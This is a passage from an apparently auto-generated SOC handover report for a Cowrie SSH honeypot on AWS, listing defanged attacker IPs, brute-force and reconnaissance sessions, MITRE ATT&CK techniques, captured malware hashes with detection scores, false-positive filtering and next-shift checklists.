| `2026-03-13 04:03:31` | `cowrie.direct-tcpip.request` |
| `2026-03-13 04:03:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.148.187[.]172` to AbuseIPDB if not already reported
- [ ] Block `186.148.187[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `197.199.224[.]52` | **13** | 2026-03-13 01:02 | 2026-03-13 01:29 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.47.159[.]125` | **12** | 2026-03-13 01:47 | 2026-03-13 02:22 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `179.33.210[.]213` | **12** | 2026-03-13 01:45 | 2026-03-13 02:10 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `151.33.113[.]95` | **9** | 2026-03-13 01:06 | 2026-03-13 01:32 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.134[.]158` | **8** | 2026-03-13 01:46 | 2026-03-13 01:59 | 15m | 0 | `T1592` | 🟢 LOW |
| `3.143.162[.]210` | **7** | 2026-03-13 03:03 | 2026-03-13 03:11 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `45.156.128[.]54` | **3** | 2026-03-13 00:05 | 2026-03-13 00:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `35.222.117[.]243` | **2** | 2026-03-13 00:00 | 2026-03-13 00:02 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `74.249.184[.]13` | **2** | 2026-03-13 01:23 | 2026-03-13 01:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.13.5[.]50` | 1 | 2026-03-13 00:26 | 2026-03-13 00:26 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `110.54.127[.]34` | 1 | 2026-03-13 00:45 | 2026-03-13 00:46 | 31s | 0 | `T1592` | 🟢 LOW |
| `112.5.76[.]239` | 1 | 2026-03-13 00:07 | 2026-03-13 00:07 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.140.95[.]250` | 1 | 2026-03-13 02:27 | 2026-03-13 02:27 | 3s | 0 | `T1592` | 🟢 LOW |
| `116.59.9[.]114` | 1 | 2026-03-13 00:47 | 2026-03-13 00:47 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.127.40[.]41` | 1 | 2026-03-13 01:44 | 2026-03-13 01:44 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.26.153[.]102` | 1 | 2026-03-13 02:46 | 2026-03-13 02:46 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.241.79[.]66` | 1 | 2026-03-13 00:38 | 2026-03-13 00:39 | 61s | 1 | `T1110.001` | 🟢 LOW |
| `125.17.185[.]94` | 1 | 2026-03-13 02:45 | 2026-03-13 02:45 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.12[.]224` | 1 | 2026-03-13 00:07 | 2026-03-13 00:07 | 10s | 0 | `T1592` | 🟢 LOW |
| `186.103.136[.]43` | 1 | 2026-03-13 04:02 | 2026-03-13 04:02 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.251.1[.]179` | 1 | 2026-03-13 02:09 | 2026-03-13 02:10 | 13s | 0 | `T1592` | 🟢 LOW |
| `195.33.218[.]186` | 1 | 2026-03-13 00:47 | 2026-03-13 00:47 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.133.4[.]160` | 1 | 2026-03-13 03:53 | 2026-03-13 03:54 | 30s | 0 | `T1592` | 🟢 LOW |
| `223.123.41[.]68` | 1 | 2026-03-13 04:10 | 2026-03-13 04:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `43.224.125[.]54` | 1 | 2026-03-13 00:38 | 2026-03-13 00:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]53` | 1 | 2026-03-13 00:06 | 2026-03-13 00:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.207.9[.]39` | 1 | 2026-03-13 03:43 | 2026-03-13 03:43 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-03-13 02:22 | 2026-03-13 02:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]137` | 1 | 2026-03-13 00:12 | 2026-03-13 00:12 | 2s | 0 | `T1592` | 🟢 LOW |
| `90.161.217[.]228` | 1 | 2026-03-13 00:25 | 2026-03-13 00:27 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.68.11[.]140` | 1 | 2026-03-13 02:30 | 2026-03-13 02:30 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (3 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `65.20.233[.]110` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 19 |
| `90.161.217[.]228` | ES | Orange Espagne SA | **100** ⚠️ | 50 |
| `195.33.218[.]186` | TR | HYUNDAI EUROTEM DEMIRYOLU ARACLARI SANAYI VE TICARET ANONIM SIRKETI | **100** ⚠️ | 50 |
| `186.148.187[.]172` | CO | TV AZTECA SUCURSAL COLOMBIA | **100** ⚠️ | 6 |
| `151.33.113[.]95` | IT | WIND | **100** ⚠️ | 3 |
| `45.156.128[.]54` | NL | INAP-AMS-1 | **100** ⚠️ | 50 |
| `49.207.9[.]39` | IN | Beam Telecom Pvt Ltd | **100** ⚠️ | 10 |
| `179.33.210[.]213` | CO | COLOMBIA TELECOMUNICACIONES S.A. ESP | **100** ⚠️ | 50 |
| `35.222.117[.]243` | US | Google LLC | **100** ⚠️ | 50 |
| `101.47.159[.]125` | SG | BYTEPLUS | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | — |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | — |
| [T1078](https://attack.mitre.org/techniques/T1078) | — |
| [T1105](https://attack.mitre.org/techniques/T1105) | — |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | — |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05 | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26 | Incident Timeline Generator | ✅ 120 session(s) |
| Tool 27 | Threat Intel Feeder         | ✅ 47 IP(s) enriched |
| Tool 29 | False Positive Tracker      | ✅ 14 filtered (11.7%) |
| Tool 30 | Metric Exporter             | ✅ stats.json written |
| Tool 31 | Malware Analyzer            | ✅ 3 file(s) analyzed |
| Tool 28 | SOC Handover Report         | ✅ This report |

> **Report grouping:** 16 priority case(s) shown individually · 31 recon entry/entries in table (9 group(s) consolidating 68 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.1 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-13T04:11:32Z_
